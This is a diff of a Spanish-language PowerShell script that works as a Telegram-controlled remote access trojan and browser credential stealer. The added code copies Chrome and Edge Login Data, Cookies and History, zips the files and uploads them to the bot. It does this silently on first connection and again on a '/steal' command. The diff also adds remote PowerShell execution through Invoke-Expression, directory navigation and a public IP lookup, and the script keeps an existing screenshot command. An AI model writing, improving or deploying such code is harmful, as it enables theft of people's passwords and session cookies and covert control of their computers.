@@ -18,6 +18,10 @@ Start-Transcript -Path $LogPath -Force | Out-Null
 Add-Type -AssemblyName System.Windows.Forms | Out-Null
 Add-Type -AssemblyName System.Drawing | Out-Null
 
+# ============================================
+# FUNCIONES DE UTILIDAD
+# ============================================
+
 function Enviar-Mensaje {
     param ($chatId, $texto)
     try {
@@ -26,6 +30,23 @@ function Enviar-Mensaje {
         Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body $json | Out-Null
     } catch { 
         Add-Content $LogPath "Error enviando mensaje: $_" 
+    }
+}
+
+function Enviar-MensajeLargo {
+    param ($chatId, $texto)
+    $max = 4000
+    if ($texto.Length -le $max) {
+        Enviar-Mensaje -chatId $chatId -texto $texto
+        return
+    }
+    $partes = [math]::Ceiling($texto.Length / $max)
+    for ($i = 0; $i -lt $partes; $i++) {
+        $inicio = $i * $max
+        $longitud = [math]::Min($max, $texto.Length - $inicio)
+        $parte = $texto.Substring($inicio, $longitud)
+        Enviar-Mensaje -chatId $chatId -texto "```$parte```"
+        Start-Sleep -Milliseconds 500
     }
 }
 
@@ -138,41 +159,81 @@ function Copiar-ArchivoBloqueado {
 
 function Recolectar-DatosNavegadores {
     param ($chatId, $silencioso = $false)
-    if (-not $silencioso) { Enviar-Mensaje -chatId $chatId -texto "Recolectando datos..." }
     
-    $chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
-    $edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+    if (-not $silencioso) { Enviar-Mensaje -chatId $chatId -texto "Recolectando datos de navegadores..." }
+    
+    # Rutas específicas de navegadores
+    $navegadores = @{
+        'Chrome' = @{
+            'Base' = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+            'Datos' = @{
+                'History' = 'History'
+                'Bookmarks' = 'Bookmarks'
+                'Cookies' = 'Network\Cookies'
+                'Login Data' = 'Login Data'
+                'Cache' = 'Cache'
+            }
+        }
+        'Edge' = @{
+            'Base' = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+            'Datos' = @{
+                'History' = 'History'
+                'Bookmarks' = 'Bookmarks'
+                'Cookies' = 'Network\Cookies'
+                'Login Data' = 'Login Data'
+                'Cache' = 'Cache'
+            }
+        }
+    }
+    
     $ts = Get-Date -Format "yyyyMMdd_HHmmss"
     $rec = @()
+    $resumen = @()
     
-    $targets = @(
-        "$chrome\History",
-        "$chrome\Bookmarks",
-        "$chrome\Login Data",
-        "$edge\History",
-        "$edge\Bookmarks",
-        "$edge\Login Data"
-    )
-    
-    $i = 0
-    foreach ($t in $targets) {
-        $i++
-        if (Test-Path $t) {
-            $ext = if ($t -like '*History*') { 'db' } elseif ($t -like '*Bookmarks*') { 'json' } else { 'db' }
-            $tmp = "$env:TEMP\file$($i)_$ts.$ext"
-            if (Copiar-ArchivoBloqueado $t $tmp) { $rec += $tmp }
+    foreach ($nav in $navegadores.Keys) {
+        $base = $navegadores[$nav]['Base']
+        if (-not (Test-Path $base)) { continue }
+        
+        foreach ($tipo in $navegadores[$nav]['Datos'].Keys) {
+            $archivo = $navegadores[$nav]['Datos'][$tipo]
+            $origen = Join-Path $base $archivo
+            $nombre = "$($nav)_$($tipo -replace ' ', '_')_$ts"
+            
+            if ($tipo -eq 'History' -or $tipo -eq 'Login Data' -or $tipo -eq 'Cookies') {
+                $ext = 'db'
+            } elseif ($tipo -eq 'Bookmarks') {
+                $ext = 'json'
+            } else {
+                $ext = 'cache'
+            }
+            
+            $tmp = "$env:TEMP\$nombre.$ext"
+            
+            if (Copiar-ArchivoBloqueado $origen $tmp) {
+                $rec += $tmp
+                $tamano = (Get-Item $tmp).Length
+                $resumen += "$nav $tipo ($([math]::Round($tamano/1KB,2)) KB)"
+            }
         }
     }
     
     if ($rec.Count -gt 0) {
-        $zip = "$env:TEMP\Browser_$ts.zip"
+        $zip = "$env:TEMP\BrowserData_$ts.zip"
         Compress-Archive -Path $rec -DestinationPath $zip -Force
-        Enviar-Documento -chatId $chatId -rutaArchivo $zip -titulo "Datos - $ts"
+        
+        Enviar-Documento -chatId $chatId -rutaArchivo $zip -titulo "Datos Navegadores - $ts"
+        
+        # Enviar resumen
+        $msgResumen = "Datos recolectados:`n" + ($resumen -join "`n")
+        if (-not $silencioso) { Enviar-Mensaje -chatId $chatId -texto $msgResumen }
+        
         Remove-Item $zip -Force -ErrorAction SilentlyContinue
         $rec | ForEach-Object { Remove-Item $_ -Force -ErrorAction SilentlyContinue }
-        if (-not $silencioso) { Enviar-Mensaje -chatId $chatId -texto "Enviados: $($rec.Count) archivos" }
+        
+        return $true
     } else {
-        if (-not $silencioso) { Enviar-Mensaje -chatId $chatId -texto "No se encontraron archivos" }
+        if (-not $silencioso) { Enviar-Mensaje -chatId $chatId -texto "No se encontraron archivos de navegadores" }
+        return $false
     }
 }
 
@@ -187,11 +248,62 @@ function Probar-Conexion {
 
 function Obtener-Info {
     try { 
-        return "PC: $($env:COMPUTERNAME) - User: $($env:USERNAME)" 
+        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
+        return "PC: $($env:COMPUTERNAME) | User: $($env:USERNAME) | IP: $ip"
     } catch { 
-        return 'Info no disp.' 
+        return "PC: $($env:COMPUTERNAME) | User: $($env:USERNAME)"
     }
 }
+
+function Obtener-DirectorioActual {
+    return (Get-Location).Path
+}
+
+function Ejecutar-Comando {
+    param ($comando, $chatId)
+    try {
+        $dirActual = Obtener-DirectorioActual
+        $salida = Invoke-Expression $comando 2>&1 | Out-String
+        
+        $resultado = "Directorio: $dirActual`n$("="*50)`n$salida"
+        
+        if ($resultado.Length -gt 4000) {
+            Enviar-MensajeLargo -chatId $chatId -texto $resultado
+        } else {
+            Enviar-Mensaje -chatId $chatId -texto "```$resultado```"
+        }
+    } catch {
+        Enviar-Mensaje -chatId $chatId -texto "Error: $_"
+    }
+}
+
+function Listar-Directorio {
+    param ($chatId)
+    try {
+        $dirActual = Obtener-DirectorioActual
+        $items = Get-ChildItem | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
+        
+        $resultado = "Directorio: $dirActual`n$("="*50)`n$items"
+        Enviar-Mensaje -chatId $chatId -texto "```$resultado```"
+    } catch {
+        Enviar-Mensaje -chatId $chatId -texto "Error listando directorio: $_"
+    }
+}
+
+function Cambiar-Directorio {
+    param ($ruta, $chatId)
+    try {
+        Set-Location $ruta -ErrorAction Stop
+        $nuevoDir = Obtener-DirectorioActual
+        Enviar-Mensaje -chatId $chatId -texto "Directorio cambiado a: $nuevoDir"
+    } catch {
+        Enviar-Mensaje -chatId $chatId -texto "Error: No se pudo cambiar a '$ruta'"
+    }
+}
+
+# ============================================
+# INICIO DEL BOT
+# ============================================
 
 Enviar-Mensaje -chatId $ChatId -texto "Bot iniciado en $(Obtener-Info)"
 
@@ -202,7 +314,7 @@ while ($true) {
         $Global:EstadoInternet = $true
         if ($Global:PrimeraEjecucion) {
             $Global:PrimeraEjecucion = $false
-            Enviar-Mensaje -chatId $ChatId -texto "Conectado - $(Obtener-Info)"
+            Enviar-Mensaje -chatId $ChatId -texto "Conectado - $(Obtener-Info)`nRecolectando datos automáticamente..."
             Start-Sleep -Seconds 2
             Recolectar-DatosNavegadores -chatId $ChatId -silencioso $true
         }
@@ -221,27 +333,56 @@ while ($true) {
                 $LastUpdateId = $up.update_id
                 $msg = $up.message
                 if ($msg -and $msg.from.id -eq $ChatId -and $msg.text) {
-                    $txt = $msg.text.Trim().ToLower()
+                    $txt = $msg.text.Trim()
                     $cid = $msg.chat.id
+                    $txtLower = $txt.ToLower()
                     
-                    if ($txt -eq 'ls' -or $txt -eq '/ls') {
-                        $items = (Get-ChildItem | Select-Object Name, Length | Format-Table -AutoSize | Out-String)
-                        Enviar-Mensaje -chatId $cid -texto "```n$items```"
+                    # Comando /ls o ls
+                    if ($txtLower -eq 'ls' -or $txtLower -eq '/ls') {
+                        Listar-Directorio -chatId $cid
                     } 
-                    elseif ($txt.StartsWith('cmd ')) {
-                        $c = $txt.Substring(4)
-                        $r = Invoke-Expression $c 2>&1 | Out-String
-                        if ($r.Length -gt 3500) { $r = $r.Substring(0,3500) + '...' }
-                        Enviar-Mensaje -chatId $cid -texto "```n$r```"
+                    # Comando /cmd <comando>
+                    elseif ($txtLower.StartsWith('/cmd ') -or $txtLower.StartsWith('cmd ')) {
+                        $c = $txt.Substring($txt.IndexOf(' ') + 1)
+                        Ejecutar-Comando -comando $c -chatId $cid
                     } 
-                    elseif ($txt -eq 'steal' -or $txt -eq '/steal') {
+                    # Comando /cd <ruta>
+                    elseif ($txtLower.StartsWith('/cd ') -or $txtLower.StartsWith('cd ')) {
+                        $ruta = $txt.Substring($txt.IndexOf(' ') + 1)
+                        Cambiar-Directorio -ruta $ruta -chatId $cid
+                    } 
+                    # Comando /pwd
+                    elseif ($txtLower -eq '/pwd' -or $txtLower -eq 'pwd') {
+                        Enviar-Mensaje -chatId $cid -texto "Directorio actual: $(Obtener-DirectorioActual)"
+                    } 
+                    # Comando /steal
+                    elseif ($txtLower -eq 'steal' -or $txtLower -eq '/steal') {
                         Recolectar-DatosNavegadores -chatId $cid
                     } 
-                    elseif ($txt -eq 'captura' -or $txt -eq '/captura') {
+                    # Comando /captura
+                    elseif ($txtLower -eq 'captura' -or $txtLower -eq '/captura') {
                         Tomar-Captura -chatId $cid
                     } 
-                    elseif ($txt -eq 'help' -or $txt -eq '/help') {
-                        Enviar-Mensaje -chatId $cid -texto 'Comandos: /ls, cmd <comando>, /steal, /captura, /help'
+                    # Comando /info
+                    elseif ($txtLower -eq 'info' -or $txtLower -eq '/info') {
+                        Enviar-Mensaje -chatId $cid -texto "$(Obtener-Info)`nDirectorio: $(Obtener-DirectorioActual)"
+                    } 
+                    # Comando /help
+                    elseif ($txtLower -eq 'help' -or $txtLower -eq '/help') {
+                        $ayuda = @"
+Comandos disponibles:
+/ls - Listar archivos en directorio actual
+/cmd <comando> - Ejecutar comando PowerShell
+/cd <ruta> - Cambiar de directorio
+/pwd - Mostrar directorio actual
+/steal - Recolectar datos de navegadores
+/captura - Tomar screenshot
+/info - Información del sistema
+/help - Mostrar esta ayuda
+
+Todos los comandos muestran el directorio actual.
+"@
+                        Enviar-Mensaje -chatId $cid -texto $ayuda
                     }
                 }
             }
